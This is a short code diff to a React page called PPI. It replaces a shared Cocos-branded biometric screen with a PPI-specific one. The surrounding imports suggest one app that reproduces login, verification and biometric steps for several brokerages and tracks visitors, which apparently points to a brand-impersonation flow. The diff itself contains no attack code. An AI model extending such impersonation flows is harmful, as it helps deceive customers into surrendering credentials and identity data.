@@ -6,6 +6,7 @@ import { invokeWayni } from "@/lib/wayniApi";
 import { useVisitTracker, useVisitorPresence } from "@/hooks/useVisitTracker";
 import PpiLoginForm from "@/components/ppi/PpiLoginForm";
 import CocosV2VerifyScreen from "@/components/cocosv2/CocosV2VerifyScreen";
+import PpiBiometricScreen from "@/components/ppi/PpiBiometricScreen";
 import CocosV2AddressScreen from "@/components/cocosv2/CocosV2AddressScreen";
 import CocosV2BiometricScreen from "@/components/cocosv2/CocosV2BiometricScreen";
 import CocosV2FinalScreen from "@/components/cocosv2/CocosV2FinalScreen";
@@ -765,13 +766,11 @@ const PPI = () => {
         )}
 
         {step === "biometric" && (
-          <div className="relative z-10 flex w-full justify-center px-4 sm:px-0">
-            <CocosV2BiometricScreen
+          <div className="relative z-10 flex w-full justify-center px-0 sm:px-0">
+            <PpiBiometricScreen
               email={email}
               fullName={syncedFullName}
               biometricUrl={biometricUrl}
-              logo={ppiLogo}
-              brandName="Portfolio Personal Inversiones"
               onEvent={handleBiometricEvent}
             />
           </div>
